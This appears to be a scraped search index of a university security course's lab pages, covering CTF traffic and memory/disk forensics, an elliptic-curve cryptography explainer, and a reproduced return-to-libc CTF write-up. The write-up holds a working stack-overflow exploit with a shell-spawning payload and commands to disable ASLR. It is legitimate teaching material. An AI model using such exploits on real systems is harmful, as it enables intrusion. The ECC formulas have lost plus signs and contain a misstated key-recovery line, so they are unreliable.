trace TCP streams. By selecting a datagram and right-clicking on \"Trace TCP Stream\", you can obtain all the data transmitted by both parties in the TCP session for further analysis, see Figure 9-3-6.</p> <p></p> <p>For common protocols such as HTTP, Wireshark provides an export object function (in the \"File\" menu) that makes it easy to extract information such as files sent during transmission. Figure 9-3-7 shows the export function for HTTP objects.</p> <p></p> <p>Sometimes the traffic packets that need to be analyzed are almost always encrypted traffic for the SSL protocol, and if the SSL key log can be obtained from another location in the topic, then Wireshark can be used to attempt to decrypt the traffic. The Wireshark parsable SSL key log file is shown below.</p> <p></p> <p>After obtaining this form of key log, we can open Wireshark's preferences, select the SSL protocol in the \"Protocol\" option, and then fill in the path to the key file in \"(Pre)-Master-Secret Log Filename\" (see Figure 9-3-8), and then decrypt some of the SSL traffic.</p> <p></p> <p>Due to the complexity of network protocols, there are far more places where data can be hidden than just the normal transmission flow. Therefore, when analyzing network traffic packets, if no breakthrough can be found from the data transmitted in the normal way, then it is necessary to focus on some protocols that look abnormal in the traffic packets and carefully examine the fields to observe whether there is any imprint of hidden data. Figure 9-3-9 and Figure 9-3-10 are examples of using the length of ICMP datagram to hide information in a foreign CTF competition.</p> <p></p> <p></p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#analysis-of-special-kinds-of-traffic-packages","title":"Analysis of special kinds of traffic packages","text":"<p>There are some special kinds of traffic analysis in CTF, and the traffic package provided in the title is not network traffic, but other types of traffic. This section will introduce the analysis method of USB keyboard and mouse traffic.</p> <p>USB traffic packets in Wireshark are shown in Figure 9-3-11. In CTF, we only need to focus on USB Capture Data, that is, the acquired USB data, according to the form of data can determine the different USB devices. Detailed documentation about USB data can be obtained from the official USB website, such as https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf and https://usb.org/sites/default/files/ documents/hid1_11.pdf.</p> <p></p> <p>The USB keyboard datagram has 8 bytes each time, and the specific meaning is shown in Table 9-3-1.</p> <p>Since it is usually pressed one key at a time during normal use, you only need to pay attention to the key combination status of byte 0 and the key code of byte 2. See Table 9-3-2 for the meaning of the 8-bit key combination in byte 0.</p> <p>The USB mouse datagram is 3 bytes, see Table 9-3-3 for the specific meaning.</p> <p></p> <p></p> <p></p> <p>The partial mapping table for the keyboard keys is shown in Figure 9-3-12 (from the official USB documentation), the full mapping table can be found on the official USB website.</p> <p>For a USB traffic packet, the Tshark tool can easily obtain the pure data fields: tshark-r filename.pcapng-T fields-e usb.capdata After obtaining the data, according to the previous meaning, using languages such as Python, you can write scripts to restore the information and get it for further analysis.</p> <p></p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#summary-of-traffic-packet-analysis","title":"Summary of traffic packet analysis","text":"<p>In CTF, there are a variety of traffic packet analysis topics, and the above is just a brief introduction to the common test points and basic solution ideas. If you encounter other types of questions, the reader also needs to be familiar with the corresponding protocols to analyze where information may be hidden.</p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#memory-image-forensics","title":"Memory Image Forensics","text":""},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#introduction-to-memory-image-forensics","title":"Introduction to memory image forensics","text":"<p>Memory forensics questions in CTF take the form of providing a complete memory image or a core dump file, and participants should analyze information such as the processes being executed in memory to solve what they need. Memory forensics often works in conjunction with other forensics, and a common framework is Volatility, an open source professional memory forensics tool from the Volatility Open Source Foundation that supports memory image analysis for Windows, Linux, and other operating systems.</p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#common-operations-for-memory-image-forensics","title":"Common operations for memory image forensics","text":"<p>When we get a memory image, we first need to determine the basic information of the image, the most important of which is to determine what kind of operating system the image is. volatility tool provides the basic analysis of the image, using the imageinfo command to get the image information, see Figure 9-3-13.</p> <p></p> <p>Once we have the image information, we can use a specific configuration file to analyze the image. Volatility provides many commands for analyzing processes, such as pstree, psscan, pslist, etc. These commands vary in strength and output. Figure 9-3-14 shows the process information obtained using psscan.</p> <p></p> <p>In addition, the filescan command can scan open files, as shown in Figure 9-3-15. When a suspicious file or process in memory is identified, the relevant data can be exported using the dumpfile and memdump commands, and then the exported data can be binary analyzed. the Screenshot function can obtain a screenshot of the system at this moment, see Figure 9-3-16.</p> <p></p> <p></p> <p>For different systems, Volatility supports many unique features, such as support for getting text directly from an open Notepad process under Windows, or Dumping out information such as password hash values contained in memory about Windows logins.</p> <p>Volatility supports third-party plugins, and there are many developers who have developed powerful plugins such as https://github.com/superponible/volatility-plugins. When the commands that come with the framework don't meet your needs, look for a good plugin.</p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#memory-image-forensics-summary","title":"Memory Image Forensics Summary","text":"<p>For memory forensics topics, we can easily solve them if we are familiar with the common commands of Volatility tools and can analyze the extracted files in combination with other types of knowledge (e.g. image steganography, zip analysis, etc.).</p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#disk-image-forensics","title":"Disk image forensics","text":""},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#introduction-to-disk-image-forensics","title":"Introduction to disk image forensics","text":"<p>Disk forensics questions in CTF typically provide a disk image in an unknown format, and participants need to analyze the usage traces left by the user to find hidden data. Since disk forensics is a file-based analysis, it often appears alongside other directions that examine forensics and are closer to real forensics work. Compared to memory forensics, disk forensics is generally more informative, although it is relatively easy to locate specific usage traces of users because it contains more information. Disk forensics generally does not require specialized software, unless it is a disk image in some special format, such as VMWare's VMDK or Encase's EWF.</p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#common-operations-for-disk-image-forensics","title":"Common operations for disk image forensics","text":"<p>Similar to memory forensics, the first step in disk forensics is to determine the type of disk and mount it, which can be done with the file command that comes with UNIX/Linux, see Figure 9-3-17.</p> <p></p> <p>After confirming the type, you can use the \"fdisk-l\" command to view the volume information on the disk and get the type, offset, etc. of each volume, see Figure 9-3-18. Then you can mount the disk image using the \"mount\" command. mount The format of the command is as follows.</p> <p></p> <p>For local file mounts, the \"loop\" item is included, and if it is a multi-partition image as described above, then the \"offset\" item should be added and its value specified. If the file system is not natively supported by the system, then you need to install the relevant driver, such as NTFS-3g driver for mounting NTFS file system under Linux. The successfully mounted folder is shown in Figure 9-3-19.</p> <p></p> <p>Once the image is mounted, the questioner must have operated on the file system when creating the image, so you can follow the common forensic steps to analyze the file system usage traces. For example, the \".bash_history\" file in the Linux file system and the Recent folder under Windows will have a history of operations on the file system, see Figure 9-3-20.</p> <p></p> <p>Once the suspicious file is obtained, it can be extracted for binary analysis. In most cases, the suspicious file itself will use other information hiding techniques, such as steganography.</p> <p>There are also disk image forensic type questions that focus on the unique features of certain file systems, such as inode recovery in EXT series file systems, FAT table recovery in FAT series file systems, snapshot features and nanosecond timestamp features of APFS file systems, etc. When you encounter a bottleneck in the analysis of a file, you may want to understand the characteristics of the file system itself to find a breakthrough.</p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#disk-image-forensics-summary","title":"Disk image forensics summary","text":"<p>Disk forensics questions are actually similar to memory forensics questions and are often combined with compressed package analysis, image steganography, and other types of questions. As long as the participant is familiar with common images, can determine the type of image and mount or extract the file, and with a certain understanding of the file system, he or she can successfully solve hard disk forensics related questions.</p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#summary","title":"Summary","text":"<p>With the continuous development of CTF, Misc type questions examine a wider and wider range of knowledge points, and become more and more difficult compared to the simple picture steganography of a few years ago. Due to the limitation of space, this chapter only briefly introduces several sets of questions that appear more frequently in the CTF. As written in the introduction of this chapter, in high quality competitions, in addition to the set of questions introduced in this chapter, participants often encounter many novel questions, which either examine the depth and breadth of the participants' knowledge, or examine the participants' ability to learn quickly. These require the participants to have certain computer expertise, as well as the need to search and read a lot of information with the help of search engines, and to solve the topics through rapid learning.</p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#assignment","title":"Assignment","text":""},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#1-easy-sign-in","title":"(1-Easy) Sign in","text":"<p>What's a CTF? Join our QQ Group to get the flag!</p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#2-medium-http-code-206","title":"(2-Medium) HTTP code 206","text":"<p>Flag? Flag!</p> <p><code>Flag format: flag{xxxxxxxx}</code></p> <p>Download attachment: fenxi.pcapng</p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#3-hard-time-based-sql-injection","title":"(3-Hard) Time-based SQL Injection","text":"<p>In fact this isn't a Web challenge.</p> <p><code>Flag format: flag{xxxxxxxx}</code></p> <p>Download attachment: sql.pcapng</p>"},{"location":"CS315/Lab%2010%20Public%20Key%20Cryptography/","title":"Lab 10: Public Key Cryptography","text":"<p>Reference https://ithelp.ithome.com.tw/articles/10251031 by \u7f8a\u5c0f\u54a9</p> <p>Today we are going to introduce ECC, which is also a security mechanism based on mathematical difficulties.</p> <p>Since ECC is originally a difficult algorithm, the ECC process and principles in the text are streamlined with many steps, algorithms, and some terminology in the mathematical field</p> <p>Geometric addition, Algebraic addition, Scalar multiplication, Abelian group... These are not easy to understand in a few words, but require some basic concepts.</p> <p>In general, I think it is a simple and concise way to explain</p> <p>I think it is really difficult to explain ECC concisely.</p> <p></p>"},{"location":"CS315/Lab%2010%20Public%20Key%20Cryptography/#ecc-introduction","title":"ECC Introduction","text":"<p>Elliptic Curve Cryptography (ECC) is a public key cryptography algorithm based on the mathematics of elliptic curves. The use of elliptic curves in cryptography was independently proposed by Neal Koblitz and Victor Miller in 1985.</p> <p>Another advantage of ECC is that it can define bilinear mappings between groups, based on Weil pairs or Tate pairs; bilinear mappings have found numerous applications in cryptography, such as identity-based encryption.</p> <p></p>"},{"location":"CS315/Lab%2010%20Public%20Key%20Cryptography/#concept-term-definition","title":"Concept / Term Definition","text":""},{"location":"CS315/Lab%2010%20Public%20Key%20Cryptography/#elliptic-curve","title":"Elliptic Curve","text":"<p>An elliptic curve is a plane curve defined by an equation of the form:</p> <p></p> <p>where a and b are real numbers. This class is called the Weierstrass equation</p> <p></p>"},{"location":"CS315/Lab%2010%20Public%20Key%20Cryptography/#elliptic-curve-rule-group-rule","title":"Elliptic Curve Rule (Group Rule)","text":"<p>Addition</p> <p>Draw a straight line through two points P and Q on the curve and find the intersection of the straight line and the elliptic curve -R</p> <p>The point of intersection is defined as P Q. The point of intersection is defined as the symmetric position of the x-axis. As shown in the figure below: PQ = R</p> <p></p> <p>Multiplicative definition (two-fold operation)</p> <p>The above method does not explain the case where P P, i.e., two points coincide. Therefore, in this case, the tangent of the elliptic curve at point P, the intersection with the elliptic curve, and the point of the intersection about the symmetric position of the x-axis are defined as P P, i.e., 2P, which is a doubling operation</p> <p></p> <p>Infinity point</p> <p>If we add A and -A, the straight line through A and -A is parallel to the y-axis, and the straight line intersects the elliptic curve at the infinity point.</p> <p></p>"},{"location":"CS315/Lab%2010%20Public%20Key%20Cryptography/#definition-of-elliptic-curve","title":"Definition of Elliptic Curve","text":"<p>According to the definition of the above properties, we can organize</p> <ul> <li> <p>The equation of elliptic curve is y^2=x^3+ax+b</p> </li> <li> <p>This curve is exactly symmetric to the x-axis (y=0) of this straight line</p> </li> <li> <p>The parameters a and b must satisfy 4a^3+27b^2\u22600 to ensure that there are no repeated roots and have a unique solution!</p> </li> <li> <p>The additive unit element O is an infinite point and satisfies O = -O</p> </li> <li> <p>This additive unit element also needs to satisfy: a point on the elliptic curve that is common to three points whose union is O</p> </li> </ul>"},{"location":"CS315/Lab%2010%20Public%20Key%20Cryptography/#elliptic-curve-characteristics","title":"Elliptic Curve Characteristics","text":"<ul> <li> <p>Any point on the curve is reflected by the x-axis (y=0) and remains the same curve (peculiar symmetry)</p> </li> <li> <p>Any line not perpendicular to the curve will have at most three points of intersection</p> </li> </ul> <p>Strange symmetry</p> <p>The elliptic curve is drawn. It has several interesting properties.</p> <p>One of them is horizontal symmetry. Any point on the curve can be reflected on the x-axis and maintain the same curve. An even more interesting property is that any non-perpendicular line will intersect the curve in at most three places.</p> <p>The elliptic curve is compared to a game of batting, where the ball is clicked from point A to point B. When it hits a point on the curve, the ball is then moved to the next point, When it hits a point on the curve, it bounces back to point C on the other side (above or below the x-axis).</p> <p></p> <p>First imagine that the ball moves in two points called \"dot\"</p> <p>A dot B = C A dot A = B A dot C = D ... ... ...</p> <p>There are only two points here (called: the initial point &amp; final point)</p> <p>The initial point P is tapped n times by itself (as Private Key) to get a final point Q (as Public Key)</p> <p>Even if you know the \"initial point\" and \"final point\"</p> <p>It is very, very difficult to find n!</p>"},{"location":"CS315/Lab%2010%20Public%20Key%20Cryptography/#finite-domain-galois-domain-and-discrete-logarithm","title":"Finite domain (Galois domain) and discrete logarithm","text":"<p>elliptic curves are continuous and easily extrapolated, and therefore, are not suitable for encryption.</p> <p>Therefore, we must make the elliptic curve a discrete point</p> <p>The elliptic curve is defined on a finite field, and then the integer field GF(p) modulo the prime number is used</p> <p>A finite field GF(p) is a set of integers consisting of 0, 1, 2 ......p-1 with p elements, given a certain prime number p. It is defined by adding, subtracting, multiplying, and dividing.</p> <p>Suppose the elliptic curve is y\u00b2 = x\u00b3+x+1, which is written as follows when it is over a finite field GF(23)</p> <p>y\u00b2 \u2261 x\u00b3+x+1 (mod 23)</p> <p>The elliptic curve is no longer smooth at this point, but with some discontinuous points, as shown in the figure below. For example, the point (1,7), 7\u00b2 \u2261 1\u00b3 1 1 \u2261 3 (mod 23). In this way, there are also points as follows.</p> <pre><code>\u3000\u3000(0,1) (0,22)\n\u3000\u3000(1,7) (1,16)\n\u3000\u3000(3,10) (3,13)\n\u3000\u3000(4,0)\n</code></pre> <p>This will make the original curve look continuous</p> <p></p> <p>Converting to finite fields</p> <p></p> <p>Then you can play the game of Greedy Snake (?)</p> <p>The line from point A to point B is not perpendicular to the curved EC line and will only have at most three intersections!</p> <p>When the collision reaches the third intersection, the third intersection must find a symmetrical point C on the x-axis of the EC curve (above or below)</p> <p></p>"},{"location":"CS315/Lab%2010%20Public%20Key%20Cryptography/#eccs-simple-definition-and-operation-process","title":"ECC's simple definition and operation process","text":""},{"location":"CS315/Lab%2010%20Public%20Key%20Cryptography/#calculation-example","title":"Calculation Example","text":"<p>Set up a finite field Fp</p> <p>after the selection of the curve and the calculation of the given parameters</p> <p>The curve is known at two points P(3,10) and Q(9,7) on E23(1,1), find (1) -P, (2) P+Q, (3) 2P</p> <p></p> <p>If at a point P on the elliptic curve, there exists the smallest positive integer n such that the number multiplier nP = O\u221e , then n is called the order of P</p> <p>If n does not exist, then P is of infinite order</p> <p></p> <p>Therefore, after selecting n, we can calculate 27P = -P</p> <p>So 28P=O \u221e The order of P is 28</p> <p>These points make a cyclic Abelian group, where the generating element is P and the order is 28</p> <p>and select the basis points from it and start calculating</p> <p>Consider K=kG , where K and G are points on the elliptic curve Ep(a,b), n is the order of G (nG=O\u221e), and k is an integer smaller than n.</p> <p>Then given k and G, it is easy to calculate K according to the law of addition</p> <p>But conversely, given k and G, it is very difficult to find k</p> <p>where k and K are the private key and public key respectively.</p> <p>This is the flow of elliptic curve calculation</p> <p>An elliptic curve <code>{p,a,b,G,n,h}</code></p> <ul> <li>p : a prime number decision field</li> <li>a , b : the parameters of the curve</li> <li>G : the base point</li> <li>n : the order of G</li> <li>h : the quotient divided by an integer</li> </ul>"},{"location":"CS315/Lab%2010%20Public%20Key%20Cryptography/#principle-of-elliptic-curve-encryption-and-decryption-algorithm-ecies","title":"Principle of Elliptic Curve Encryption and Decryption Algorithm ECIES","text":"<p>Set the private key and public key as k and K respectively, i.e., K = kG, where G is the G point.</p> <p>Public key encryption.</p> <p>Choose a random number r to generate a ciphertext C from the message M, which is a point pair, i.e.</p> <p>C = {rG, M rK}, where K is the public key</p> <p>Private key decryption.</p> <p>M rK - k(rG) = M r(kG) - k(rG) = M</p> <p>where k and K are the private key and public key respectively.</p> <p>It is very difficult to find x for the known G and xG on the elliptic curve, which is the discrete logarithm problem on the elliptic curve. Here x is the private key and xG is the public key.</p>"},{"location":"CS315/Lab%2010%20Public%20Key%20Cryptography/#principle-of-elliptic-curve-signature-algorithm-ecdsa","title":"Principle of Elliptic Curve Signature Algorithm ECDSA","text":"<p>Set the private key and public key as k and K respectively, i.e., K = kG, where G is the G point.</p> <p>Private key signature.</p> <ol> <li>Choose random number r and calculate point rG(x, y).</li> <li>Calculate s = (h kx)/r based on the random number r, hash h of message M, and private key k.</li> <li>Send message M, and signature {rG, s} to the recipient</li> </ol> <p>Public key verification signature.</p> <ol> <li>Receive message M and signature {rG=(x,y), s} from the receiver.</li> <li>Find hash h based on the message.</li> <li>Use the public key K of the delivery party to calculate: hG/s xK/s and compare with rG, if equal, then the verification is successful.</li> </ol> <p>The principle is as follows.</p> <p>hG/s xK/s = hG/s x(kG)/s = (h xk)G/s</p> <p>= r(h xk)G / (h kx) = rG</p>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/","title":"Lab 11: Return-to-libc &amp; Return Oriented Programming","text":"<p>Reference https://duroz.github.io/post/247ctf-pwn-non-executable-stack/</p> <p>By Daniel Uroz</p> <p>In this post, we\u2019ll cover how to exploit a stack-based buffer overflow, this time with the stack marked as non-executable. We first detail how to manually exploit the binary locally and then in the remote server. In the end, we\u2019ll use the Python library pwntools to speed up exploit development.</p>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#challenge","title":"Challenge","text":"<p>This time, 247/CTF gives us a binary called <code>non_executable_stack</code> with the following description:</p> <p>There are no hidden flag functions in this binary. Can you make your own without executing from the stack?</p> <p>And here is an example of execution flow:</p> <pre><code>$ ./non_executable_stack \nEnter the secret password:\nkk\nIncorrect secret password!\n</code></pre> <p>It\u2019s an ELF 32-bit as in previous pwn challenges, but this time with NX bit enables to make stack segment (and any other) writable but not executable:</p> <pre><code>$ checksec non_executable_stack\n[*] '/home/urzu/247ctf/pwn/non_executable_stack'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>This <code>checksec</code> version is the one coming with pwntools (you can install it with <code>python3 -m pip install pwntools</code>), there is also a Bash script with the same functionality.</p>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#background","title":"Background","text":"<p>If we analyze the binary, we can quickly spot the use of the <code>gets</code> function to retrieve the password, so we can overflow the buffer due to no outbounds checking of the function:</p> <pre><code>$ r2 non_executable_stack \n-- Virtual machines are great, but you lose the ability to kick the hardware.\n[0x080483c0]&gt; aa\n[x] Analyze all flags starting with sym. and entry0 (aa)                   \n[0x080483c0]&gt; s sym.chall \n[0x080484d6]&gt; pdf\n            ; CALL XREF from main @ 0x804857f\n\u250c 103: sym.chall ();\n\u2502           ; var int32_t var_28h @ ebp-0x28\n\u2502           ; var int32_t var_4h @ ebp-0x4\n\u2502           0x080484d6      55             push ebp\n\u2502           0x080484d7      89e5           mov ebp, esp\n\u2502           0x080484d9      53             push ebx\n\u2502           0x080484da      83ec24         sub esp, 0x24\n[... redacted ...]\n\u2502           0x080484eb      8d45d8         lea eax, [var_28h]\n\u2502           0x080484ee      50             push eax\n\u2502           0x080484ef      e88cfeffff     call sym.imp.gets           ; char *gets(char *s) &lt;--- buffer overflow\n[... redacted ...]\n\u2502      \u2502    0x08048528      8d833de6ffff   lea eax, [ebx - 0x19c3]\n\u2502      \u2502    0x0804852e      50             push eax\n\u2502      \u2502    0x0804852f      e85cfeffff     call sym.imp.puts           ; int puts(const char *s)\n\u2502      \u2502    0x08048534      83c410         add esp, 0x10\n\u2502      \u2502    ; CODE XREF from sym.chall @ 0x8048523\n\u2502      \u2514\u2500\u2500&gt; 0x08048537      90             nop\n\u2502           0x08048538      8b5dfc         mov ebx, dword [var_4h]\n\u2502           0x0804853b      c9             leave\n\u2514           0x0804853c      c3             ret\n[0x080484d6]&gt;\n</code></pre> <p>This problem is that, whereas in previous challenges we could execute our payload directly into the stack, this time NX bit is preventing us to do so. Still, we can overwrite the return based stored in the stack to control the program flow, so why don\u2019t use the code already residing in executable segments for our purpose? This is the main idea behind Return-to-libc attack and Return-oriented programming.</p>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#return-to-libc","title":"Return-to-libc","text":"<p>This attack relies on using code marked as executable contained in the <code>libc</code> shared library. <code>libc</code> provides a runtime environment to C programs, so it is usually loaded into the memory of most processes. In this binary, we can see that it will effectively be loaded thanks to:</p> <pre><code>$ ldd non_executable_stack \nlinux-gate.so.1 (0xf7fd2000)\nlibc.so.6 =&gt; /lib32/libc.so.6 (0xf7dd4000)\n/lib/ld-linux.so.2 (0xf7fd4000)\n</code></pre> <p><code>libc</code> provides a lot of functions like <code>printf</code>, <code>scanf</code>, <code>fopen</code>, and so on. Thus, if we can execute the <code>system</code> function (which executes a shell command) with the <code>/bin/sh</code> parameter, we\u2019ll be able to prompt an interactive shell.</p>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#local-exploit","title":"Local exploit","text":"<p>We\u2019re going to develop a local version of the exploit and, to make it easier, we\u2019re going to deactivate ASLR protection of our system:</p> <pre><code>$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n0\n</code></pre> <p>Firstly, we can obtain the necessary padding to overwrite the return address by placing a breakpoint just before the <code>ret</code> instruction (<code>0x0804853c</code> in the code above) and seeing where is our input:</p> <pre><code>$ r2 -d non_executable_stack\nProcess with PID 2381 started...\n= attach 2381 2381\nbin.baddr 0x08048000\nUsing 0x8048000\nasm.bits 32\nglibc.fc_offset = 0x00148\n    -- Most likely your core dump fell into a blackhole, can't see it.\n[0xf7fd50b0]&gt; aa\n[x] Analyze all flags starting with sym. and entry0 (aa)\n[0xf7fd50b0]&gt; db 0x0804853c\n[0xf7fd50b0]&gt; dc\nEnter the secret password:\nkk\nIncorrect secret password!\nhit breakpoint at: 804853c\n[0x0804853c]&gt; px -0x2c @ esp\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0xffffd1d0  6b6b 00ff 9096 fef7 90f8 faf7 00a0 0408  kk..............\n0xffffd1e0  00e0 faf7 00e0 faf7 08d2 ffff 7c85 0408  ............|...\n0xffffd1f0  5886 0408 00a0 0408 08d2 ffff            X...........\n[0x0804853c]&gt;\n</code></pre> <p>Our input starts <code>0x2c</code> before, so this is the amount of padding we need to provide and, then, the return address of the function we want to execute (<code>system</code> in this case). In addition, thanks to deactivating ASLR, <code>libc</code> will be loaded in the same base address during multiple executions (<code>0xf7dd4000</code> in the example):</p> <pre><code>[0x0804853c]&gt; dmm\n0x08048000 0x08049000  /home/urzu/247ctf/pwn/non_executable_stack\n0xf7dd4000 0xf7ded000  /usr/lib32/libc-2.28.so\n0xf7fd4000 0xf7fd5000  /usr/lib32/ld-2.28.so\n[0x0804853c]&gt; ood\nPTRACE_CONT: No such process\nchild received signal 9\nProcess with PID 2337 started...\n= attach 2337 2337\nFile dbg:///home/urzu/247ctf/pwn/non_executable_stack  reopened in read-write mode\n2337\n[0xf7fd50b0]&gt; dc\nEnter the secret password:\nkk\nIncorrect secret password!\n[0xf7fd3069]&gt; dmm\n0x08048000 0x08049000  /home/urzu/247ctf/pwn/non_executable_stack\n0xf7dd4000 0xf7ded000  /usr/lib32/libc-2.28.so\n0xf7fd4000 0xf7fd5000  /usr/lib32/ld-2.28.so\n[0xf7fd3069]&gt;\n</code></pre> <p>So, our payload would look something like this (the dummy address is explained a bit below):</p> <pre><code>[0x2c padding] + [system address] + [dummy address] + [/bin/sh address]\n</code></pre> <p>We can obtain the function RVA with the following:</p> <pre><code>$ rabin2 -s /usr/lib32/libc-2.28.so | grep -w system\n1525  0x0003e9e0 0x0003e9e0 WEAK   FUNC   55        system\n</code></pre> <p>And the string offset (like an RVA) inside the library thanks to:</p> <pre><code>$ strings -t x /usr/lib32/libc-2.28.so | grep /bin/sh\n17eaaa /bin/sh\n</code></pre> <p>As we already know that <code>libc</code> will be loaded in <code>0xf7dd4000</code> address, we can add those RVA to the base address to obtain the following payload:</p> <pre><code>[0x2c padding] + [0xf7e129e0] + [dummy address] + [0xf7f52aaa]\n</code></pre> <p>We can check that we effectively calculate the absolute address right with radare2:</p> <pre><code>[0xf7f3b000]&gt; dmi libc system\n257   0x0012a2c0 0xf7efe2c0 GLOBAL FUNC   102       svcerr_systemerr\n658   0x0003e9e0 0xf7e129e0 GLOBAL FUNC   55        __libc_system\n1525  0x0003e9e0 0xf7e129e0 WEAK   FUNC   55        system\n[0xf7f3b000]&gt; / /bin/sh\nSearching 7 bytes in [0xf7f3b000-0xf7fab000]\nhits: 1\n0xf7f52aaa hit5_0 .b/strtod_l.c-c/bin/shexit 0canonica.\n</code></pre> <p>If we try our exploit, we can effectively obtain an interactive shell (the cat command is to maintain program stdin open and feed non_executable_stack with our commands):</p> <pre><code>$ (python2 -c 'print(\"A\"*0x2c + \"\\xe0\\x29\\xe1\\xf7\" + \"A\"*4 + \"\\xaa\\x2a\\xf5\\xf7\")' &amp;&amp; cat) | ./non_executable_stack    \nEnter the secret password:\nIncorrect secret password!\nwhoami\nurzu\n</code></pre>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#stack-frame","title":"Stack frame","text":"<p>So, why do we need a dummy address between our function call and the parameter? This is due to how stack frames are constructed during function calls. We\u2019ll see it with a simple C example:</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(int argc, char** argv) {\n    puts(\"Hello World!\");\n    return 0; \n}\n</code></pre> <p>Okay, so if we analyze the compiled binary (<code>gcc -o test.out -m32 -no-pie test.c</code>) with radare2, we'll see that the parameter <code>\"Hello World!\"</code> is passed into the stack at line <code>0x08049184</code>:</p> <pre><code>\u2502           0x0804917e      8d9008e0ffff   lea edx, [eax - 0x1ff8]\n\u2502           0x08049184      52             push edx\n\u2502           0x08049185      89c3           mov ebx, eax\n\u2502           0x08049187      e8a4feffff     call sym.imp.puts           ; int puts(const char *s)\n\u2502           0x0804918c      83c410         add esp, 0x10\n</code></pre> <p>After executing <code>0x08049184</code>, the stack looks like this:</p> <pre><code>|       ...       |\n|-----------------|\n| @\"Hello World!\" |\n|-----------------|\n|       ...       |\n</code></pre> <p>Now, the function call at <code>0x08049187</code> will push the return address into the stack, so after the <code>puts</code> function ends doing its magic, the execution flow of our program will continue as if nothing happened. This means that when <code>puts</code> start to execute, it will see the stack as this:</p> <pre><code>|       ...       |\n|-----------------|\n|    0x0804918c   | &lt;--- return address of the caller\n|-----------------|\n| @\"Hello World!\" |\n|-----------------|\n|       ...       |\n</code></pre> <p>This return address is exactly our dummy address from our payload. So, in our payload, after the shell finished executing, the binary will probably crash as the program will change execution flow to <code>0x41414141</code> and very likely nothing valid is there. Therefore, we can change our dummy address with the address of the exit function (calculated the same way that <code>system</code> function above) to produce a clean exit of the program:</p> <pre><code>[0x2c padding] + [0xf7e129e0] + [0xf7e03a60] + [0xf7f52aaa]\n</code></pre>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#remote-exploit","title":"Remote exploit","text":"<p>Well, now we know how to exploit the binary locally, but we need to consider two aspects to exploit it in the server:</p> <ul> <li>We need to assume that ASLR will be activated.</li> <li>We don\u2019t know which version of <code>libc</code> is installed.</li> </ul> <p>To overcome the two limitations, we can use a <code>libc</code> function leakage.</p>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#plt-and-got","title":"PLT and GOT","text":"<p>You can read more in detail in this blog, but we only need to know a general idea. When a dynamic linked binary is using an external function (like <code>libc</code> <code>puts</code>), your code can\u2019t reference an absolute address of the library because this will change after each execution (due to ASLR) and it won\u2019t be portable (different version of <code>libc</code> will have that function in different locations).</p> <p>So, to overcome this issue, your code reference to another section within your binary, the Procedure Linkage Table (PLT). This section is responsible for either triggering linker resolution of the target function (due to lazy binding) or jumping to the target function if it was already resolved. The latter is stored in the Global Offset Table (GOT) section, which is the actual table of offsets as filled in by the linker for external symbols.</p> <p>You can see how <code>non_executable_stack</code> reference to the PLT in the code:</p> <pre><code>[0x080484d6]&gt; pdf\n[... redacted ...]\n\u2502      \u2502    0x08048528      8d833de6ffff   lea eax, [ebx - 0x19c3]\n\u2502      \u2502    0x0804852e      50             push eax\n\u2502      \u2502    0x0804852f      e85cfeffff     call sym.imp.puts           ; int puts(const char *s)\n[... redacted ...]\n</code></pre> <p>If we see the content of that address, we can see that there is another jump:</p> <pre><code>[0x080484d6]&gt; s sym.imp.puts\n[0x08048390]&gt; pd 1\n            ; CALL XREFS from sym.chall @ 0x804851b, 0x804852f\n            ; CALL XREF from main @ 0x8048577\n\u250c 6: int sym.imp.puts (const char *s);\n\u2502 bp: 0 (vars 0, args 0)\n\u2502 sp: 0 (vars 0, args 0)\n\u2502 rg: 0 (vars 0, args 0)\n\u2514           0x08048390      ff2518a00408   jmp dword [reloc.puts]      ; 0x804a018\n</code></pre> <p>If we go to that address, we\u2019ll see that there is another reference to the binary itself, this is the PLT stub responsible to resolve the address of the external symbol, so puts haven\u2019t been invoked yet:</p> <pre><code>[0x08048390]&gt; s reloc.puts\n[0x0804a018]&gt; pd 1\n            ; DATA XREF from sym.imp.puts @ 0x8048390\n            ;-- reloc.puts:\n            0x0804a018      .dword 0x08048396                          ; RELOC 32 puts\n</code></pre> <p>If we continue execution to force <code>puts</code> resolution, now we can see that now the GOT is pointing to the actual offset in memory:</p> <pre><code>[0x0804a018]&gt; dc\nEnter the secret password:\nkk\nIncorrect secret 